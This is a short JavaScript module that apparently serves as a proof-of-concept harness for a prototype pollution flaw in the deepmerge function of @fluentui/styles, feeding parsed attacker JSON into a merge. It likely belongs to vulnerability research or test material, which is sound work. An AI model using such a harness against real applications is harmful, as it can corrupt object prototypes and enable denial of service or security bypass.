function exploitFunction(payload) {
  const styles = require("@fluentui/styles");
  const { malicious_payload } = payload;

  const source2 = {
    k3: {},
  };

  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
}

module.exports = { exploitFunction };